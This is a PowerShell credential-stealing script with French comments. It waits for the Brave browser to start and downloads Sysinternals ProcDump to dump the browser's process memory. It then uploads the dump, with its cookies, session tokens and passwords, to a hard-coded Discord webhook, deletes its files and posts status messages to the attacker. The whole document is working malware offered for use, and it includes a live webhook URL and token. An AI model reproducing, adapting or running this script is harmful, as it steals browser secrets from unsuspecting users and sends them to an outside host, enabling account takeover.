$wh="https://discord.com/api/webhooks/1467597897435582594/wbqYsXdKoKB124ig5QJCGBBb88kmkTUpEKGEq0A6oZ-81uZ0ecgtHM-D8Zq44U7uh_8W"

function Send {
    param([string]$m)
    Invoke-RestMethod -Uri $wh -Method Post -Body (@{content=$m}|ConvertTo-Json) -ContentType "application/json"|Out-Null
}

Send "🎯 Brave v20 bypass - Waiting for user activity..."

# Créer un hook sur les processus Brave
$job = Start-Job -ScriptBlock {
    param($webhook)
    
    function Send-Hook {
        param([string]$msg)
        Invoke-RestMethod -Uri $webhook -Method Post -Body (@{content=$msg}|ConvertTo-Json) -ContentType "application/json"|Out-Null
    }
    
    # Attendre que Brave soit lancé
    while (!(Get-Process brave -EA 0)) {
        Start-Sleep 5
    }
    
    Send-Hook "✅ Brave detected running"
    
    # Monitorer l'activité réseau de Brave pour détecter les connexions
    $lastCount = 0
    
    for ($i=0; $i -lt 120; $i++) {
        Start-Sleep 5
        
        $connections = Get-NetTCPConnection | Where-Object {$_.OwningProcess -in (Get-Process brave).Id}
        $newCount = $connections.Count
        
        if ($newCount -gt $lastCount) {
            Send-Hook "🌐 Network activity detected ($newCount connections)"
            
            # Dump mémoire maintenant
            cd $env:TEMP
            
            Invoke-WebRequest "https://download.sysinternals.com/files/Procdump.zip" -OutFile "pd.zip" -UseBasicParsing
            Expand-Archive "pd.zip" "pd" -Force
            
            $braveProc = Get-Process brave | Select -First 1
            .\pd\procdump64.exe -accepteula -ma $braveProc.Id dump.dmp 2>$null
            
            if (Test-Path "dump.dmp") {
                Compress-Archive "dump.dmp" "dump.zip" -Force
                curl.exe -F "file=@dump.zip" $webhook
                Send-Hook "📤 Memory dump uploaded"
                Remove-Item dump.dmp,dump.zip -Force
            }
            
            Remove-Item pd,pd.zip -Recurse -Force
            break
        }
        
        $lastCount = $newCount
    }
    
} -ArgumentList $wh

Send "⏳ Background job started - monitoring for 10 minutes..."

# Attendre 10 minutes
Wait-Job $job -Timeout 600

Remove-Job $job -Force

Send "🏁 Monitoring stopped"
